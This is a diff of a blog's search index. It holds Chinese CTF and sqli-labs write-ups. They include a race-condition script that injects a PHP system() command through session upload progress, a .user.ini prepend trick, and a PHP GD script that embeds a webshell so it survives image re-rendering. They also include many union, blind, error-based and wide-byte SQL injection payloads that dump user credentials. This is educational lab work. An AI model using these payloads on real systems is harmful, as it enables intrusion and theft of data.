class="line">//即使此时用户没有初始化Session，也会自动初始化Session,并产生一个prefix+name连接在一起的值。</span><br></pre></td></tr></table></figure>
-<p>也就是说，Session文件里有flag，当用POST方式带有命令执行的数据访问页面时，Session文件里会包含有flag数据，因此我们可以尝试获取Session文件的数据来获取flag，但由于Session文件的数据很快会被php.ini中的 <code>session.upload_progress.cleanup = on</code> 清空，因此我们需要采取条件竞争的方式获取flag。</p>
-</li>
-<li><p>上传<br>首先上传.user.ini,内容是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=&quot;png&quot;</span><br></pre></td></tr></table></figure>
-<p>然后上传png，内容是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?=include&quot;/tmp/sess_123&quot;?&gt;</span><br></pre></td></tr></table></figure>
-<p>最后使用python写一个条件竞争的脚本</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">url1 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://18d32c08-41bb-4ede-a7fd-4ecaa9b8b551.challenge.ctf.show/upload&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.post(url1, data=data1, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = session.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">           threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这段代码利用PHP Web应用程序中的竞争条件读取包含flag的文件。<br>设置了‘PHPSESSID’的cookies为’sess’的值为’123’<br>创建了两个线程: 一个重复发送POST请求到url1变量指定的URL，带有一个 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，设置为包含PHP命令注入有效负载 <code>（&lt;?php system(&quot;tac ../f*&quot;);?&gt;）</code> 的字符串，另一个则重复发送GET请求到url2变量指定的URL，检查响应文本的”flag”字符串。</p>
-</li>
-</ol>
-<h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><p>与上一题相同</p>
-<h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><p>图片上传后会对其重命名，并且需要上传真实的png图片。<br>一般的一句话木马图片上传后会对其二次渲染，导致图片内的木马消失。</p>
-<p>图片二次渲染是指对已经存在的图片进行修改或重新绘制的过程。这可以包括调整图像的颜色，添加新元素，或者删除现有元素等。<br>二次渲染可以用来改变图片的外观，或者用来添加水印，或者用来删除不需要的元素。它也可以用来调整图像的尺寸，或者对图像进行格式转换等。<br>图像二次渲染可以使用许多不同的工具来实现，包括专业的图像编辑软件，如 Photoshop 或 GIMP，也可以使用编程语言和图像处理库，如 PHP GD 库。<br>在图像处理过程中，二次渲染可以使用许多不同的技术，如图像分析、图像滤镜、图像插值和图像变换等。</p>
-<p>因此我们需要通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染。PHP代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;D:/temp/b2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 图片内木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这段代码使用了 PHP GD 库来创建一张新图片，尺寸为32x32像素。然后它使用一个十六进制数组来循环，并使用红色、绿色和蓝色值来设置图像中的像素。最后将图像保存为”b2.png”，保存在temp目录中。<br>将该图片上传后，访问该图片地址，并且传入以下参数：<br>GET:<br><code>http://eef25c0f-86f4-4cc9-9269-c17440f534c2.challenge.ctf.show/download.php?image=88c1ceb8ad1b0be7870b26ce8f79acc7.png&amp;0=system</code><br>POST:<br><code>1=cat f*</code></p>
-<p>这样便能拿到flag</p>
-<h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><p>jpg的二次渲染，但我没成功，暂时搁置吧</p>
-<h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><p>仍然失败，看来需要暂时做点别的换换心情了。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -4594,42 +4614,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_13+14+15+16</title>
-    <url>/2022/11/10/sqli-labs_13-16/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
-<span id="more"></span>
-
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
-<p>构造成功，然后使用时间盲注</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
-<p>以此类推</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_17</title>
     <url>/2022/11/11/sqli-labs_17/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始有了新变化，是一个更新密码的页面，这说明已经成功进入了系统，接下来就看看如何解决吧。</p>
@@ -4669,27 +4653,31 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_19</title>
-    <url>/2022/11/15/sqli-labs_19/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关的思路和前一关的思路是类似的，只不过稍微作了点变化。</p>
+    <title>sqli-labs_13+14+15+16</title>
+    <url>/2022/11/10/sqli-labs_13-16/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>知识都是前面已经出现过的，只是提交方式不同，没什么难度。</p>
 <span id="more"></span>
 
 <h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure>
+<p>构造成功，然后使用时间盲注</p>
 </li>
 <li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure>
+<p>以此类推</p>
 </li>
 <li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>思路一致，so easy~</p>
+<h2 id="第14关差不多，只是构造方式变成了双引号"><a href="#第14关差不多，只是构造方式变成了双引号" class="headerlink" title="第14关差不多，只是构造方式变成了双引号"></a>第14关差不多，只是构造方式变成了双引号</h2><h2 id="第15关和第11关差不多"><a href="#第15关和第11关差不多" class="headerlink" title="第15关和第11关差不多"></a>第15关和第11关差不多</h2><h2 id="第16关和第12关差不多"><a href="#第16关和第12关差不多" class="headerlink" title="第16关和第12关差不多"></a>第16关和第12关差不多</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有手就行</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -4730,6 +4718,38 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
 </ol>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>从本关开始，不再局限于提交方式了</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_19</title>
+    <url>/2022/11/15/sqli-labs_19/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关的思路和前一关的思路是类似的，只不过稍微作了点变化。</p>
+<span id="more"></span>
+
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>思路一致，so easy~</p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -5317,31 +5337,45 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_4</title>
-    <url>/2022/11/08/sqli-labs_4/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
+    <title>sqli-labs_36+37</title>
+    <url>/2022/11/18/sqli-labs_36+37/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这关基本是在重复之前的注入方式</p>
 <span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
-</li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li>
 </ol>
-<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
-<ol start="3">
-<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
-<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
-<li>此笔记为笔者初学sql注入时所写</li>
-<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>’</li>
+<li>“</li>
+<li>\x1a<br>那么直接用%df绕过</li>
 </ul>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+<ol start="2">
+<li><p>猜解SQL查询语句中的字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="第37关"><a href="#第37关" class="headerlink" title="第37关"></a>第37关</h1><p>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>毫无难度</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -5402,45 +5436,68 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_36+37</title>
-    <url>/2022/11/18/sqli-labs_36+37/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这关基本是在重复之前的注入方式</p>
+    <title>sqli-labs_4</title>
+    <url>/2022/11/08/sqli-labs_4/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
 <span id="more"></span>
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
+</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
 </ol>
-<ul>
-<li>\x00</li>
-<li>\n</li>
-<li>\r</li>
-<li>\</li>
-<li>’</li>
-<li>“</li>
-<li>\x1a<br>那么直接用%df绕过</li>
+<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
+<ol start="3">
+<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
+<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
+<li>此笔记为笔者初学sql注入时所写</li>
+<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
 </ul>
-<ol start="2">
